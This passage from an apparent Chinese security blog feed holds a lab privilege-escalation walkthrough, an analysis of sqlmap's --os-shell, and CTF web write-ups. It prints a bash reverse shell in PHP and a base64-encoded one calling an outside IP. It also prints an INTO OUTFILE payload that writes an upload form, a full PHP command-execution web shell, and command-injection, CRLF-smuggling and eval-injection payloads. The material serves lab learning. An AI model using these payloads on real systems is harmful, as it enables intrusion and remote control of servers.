id="拒绝服务漏洞提权-通过weevely进行结果失败"><a href="#拒绝服务漏洞提权-通过weevely进行结果失败" class="headerlink" title="拒绝服务漏洞提权 (通过weevely进行结果失败)"></a>拒绝服务漏洞提权 (通过weevely进行结果失败)</h2><p>然后本地寻找相关提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351957.png" alt="image-20230703135118863"><br>查看这个漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351160.png" alt="image-20230703135132114"><br>使用wget将exp下载到靶机<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031352767.png" alt="image-20230703135202692"><br>看wp的时候版本不一样的话这里有这里链接有可能失效，我这个应该可以，如果下载失败可以换个链接试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/aaaddc/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>然后解压<code>unzip 39772.zip</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353220.png" alt="image-20230703135310168"><br>进入39772目录解压<code>exploit.tar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353416.png" alt="image-20230703135326366"><br>进入解压后的目录<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353970.png" alt="image-20230703135340924"><br>运行<code>compile.sh</code>编译文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353998.png" alt="image-20230703135351940"><br>然后执行<code>./doubleput</code>提权<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354358.png" alt="image-20230703135404296"><br>这里执行失败了，看了wp有的人这里也失败了估计这个weevely不太行</p><h2 id="放弃weevely通过反弹shell进行"><a href="#放弃weevely通过反弹shell进行" class="headerlink" title="放弃weevely通过反弹shell进行"></a>放弃weevely通过反弹shell进行</h2><p>没办法只能换个方式了，直接反弹个shell到kali上吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.75.128/6666 0&gt;&amp;1&#x27; &quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354597.png" alt="image-20230703135415550"><br>访问页面拿到shell，因为前面文件已经上传所以这里直接找到文件执行命令就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354899.png" alt="image-20230703135438853"><br>提权成功，拿到flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354139.png" alt="image-20230703135449069"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap --os-shell原理分析</title>
      <link href="/undefined/59454.html"/>
      <url>/undefined/59454.html</url>
      
        <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>这里使用的是本地搭建的sqllab靶场，搭建这个靶场如果遇到数据库加载不成功大概率原因为php版本问题，php版本必须为5.x因为7以上不支持<code>mysql_connect</code>函数用的是<code>mysqli_connect</code></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><p>这里我一开始<code>--os-shell</code>一直写不进去马，还以为是我路径的问题，后面发现是<code>secure_file_priv=</code>必须为空这个条件不满足，phpstudy数据库里面没有这个参数，所以加上就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048382.png" alt="image-20230616204823343"><br>开始sql注入，先抓取一个数据包，然后关闭拦截，执行下面命令，这样可以在burp上抓取到所有的数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.102/sqli-labs-master/Less-1/?id=1&quot; --os-shell --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048866.png" alt="image-20230616204835828"><br>具体参数选择如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048412.png" alt="image-20230616204846342"><br>拿到shell</p><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>我们从下面数据包开始分析，前面的都是正常注入的过程<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048240.png" alt="image-20230616204857182"><br>这里get方式传入了一大堆url编码的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041%27%20OR%209362%3D9362%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27D%3A%2Fphpstudy_pro%2FWWW%2Fsqli-labs-master%2FLess-1%2Ftmpuqmdh.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-</span><br></pre></td></tr></table></figure><p>解码一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041&#x27; OR 9362=9362 LIMIT 0,1 INTO OUTFILE &#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -</span><br></pre></td></tr></table></figure><p>前面一条是正常的sql语句，后面是十六进制数据，把这个再解码一下,解出来是php代码，整理一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>() &lt; <span class="string">&#x27;4.1.0&#x27;</span>) &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>, <span class="number">0755</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] . <span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;  </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先看一下前面的sql语句含义</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;Y0n3er&#x27;</span></span><br></pre></td></tr></table></figure><p>这条语句其实就是在指定路径下写入Y0n3er，<code>LINES TERMINATED BY</code>参数用于指定将引号内的内容作为终止符，但是这样可以将指定的内容写入文件中，如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/test.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;Y0n3er&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049896.png" alt="image-20230616204911858"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049822.png" alt="image-20230616204920783"><br>成功写入进去，结合上面的代码分析，其实这个命令就是写一个用于文件上传的表单<code>tmpuqmdh.php</code>文件，继续分析，找到了35这个数据包，里面通过post访问上传了一个<code>tmpbkdyk.php</code>文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049628.png" alt="image-20230616204929561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];  </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="number">0</span>);  </span><br><span class="line"><span class="variable">$z</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="keyword">array</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), <span class="variable">$t</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;  </span><br><span class="line">        <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>], <span class="number">512</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, r);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">            <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>, <span class="number">512</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">array</span>();  </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$w</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$w</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码大概就是命令执行，然后输出结果，至此整个过程就差不多结束了，可以看到目录下存在几个后门文件，这里有两个文件上传表单代码，应该是我多执行了一次<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049508.png" alt="image-20230616204942475"></p><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三个条件：</span><br><span class="line">1.具有root权限。</span><br><span class="line">2.在数据库配置文件中的 配置项含有：secure_file_priv=&#x27;&#x27;。（注意在数据库中此项默认为secure_file_priv=null）。</span><br><span class="line">3.知道数据库的绝对路径。</span><br></pre></td></tr></table></figure><p>其实就是那个写入条件，另外php主动转义得关闭，GPC为off，但是GPC这个在后面的php版本都删除了用户可以自己控制，即<code>magic_quotes_gpc</code>这个选项，所以也就上面三个条件</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析一遍发现原理不是很难， 但是这个利用起来很难，要求太高了</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">sqlmap –os-shell 原理详解_os–shell_ZredamanJ的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#13 Web</title>
      <link href="/undefined/28258.html"/>
      <url>/undefined/28258.html</url>
      
        <content type="html"><![CDATA[<h2 id="一点感叹"><a href="#一点感叹" class="headerlink" title="一点感叹"></a>一点感叹</h2><p>最近很烦，比赛很简单的题也做不出来天天爆0，估计是基础没打牢吧，重新回去刷基础题</p><h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>注册账号发现admin已经存在，然后随便注册一个账号发现admin才能getFlag，就是伪造session了<br>在忘记密码发送邮件那里抓包找到key<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042149273.png" alt="image-20230604214829222"><br>然后就是伪造session了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s th3f1askisfunny -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s th3f1askisfunny -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>然后用这个session去getFlag即可</p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>点击Tool发现将114514分解了，使用<code>%0a</code>截断将前面的命令截断后面拼接要执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0acat%20%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure><p>这里<code>/</code>也要进行url编码，不然会被当做文件目录，执行成功，但是<code>cat /flag</code>出现一堆数字读出来不好读直接反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0aecho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDMuOTkuMTYwLzY2NjYgMD4mMQ==|base64 -d|bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150726.png" alt="image-20230604215000673"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>抓个包发现有个Apache&#x2F;2.4.55web服务器，这个版本有个CVE，参考<a href="https://xz.aliyun.com/t/12345#toc-7">CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用 - 先知社区 (aliyun.com)</a><br>然后我们读取index.php发现存在任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后读取<code>/usr/local/apache2/conf/httpd.conf</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150738.png" alt="image-20230604215016705"><br>这里对<code>/nssctf/</code>做了个代理转发，猜测在转发后的机器上，利用crlf漏洞去读取flag，这个payload相当于去请求转发后的机器上的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/0%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150023.png" alt="image-20230604215035976"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复现环境出了问题，其实这个题就是把原来的数据给闭合掉就能命令执行了，猜测它储存的json数据格式为<code>[1,2,3,……]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?mode=save&amp;value=];%0aecho cat /flag;%0a[</span><br><span class="line">?mode=read</span><br></pre></td></tr></table></figure><p>方式不止这一个因为环境问题也没去一个个验证了</p><h2 id="flask-jwt-hard"><a 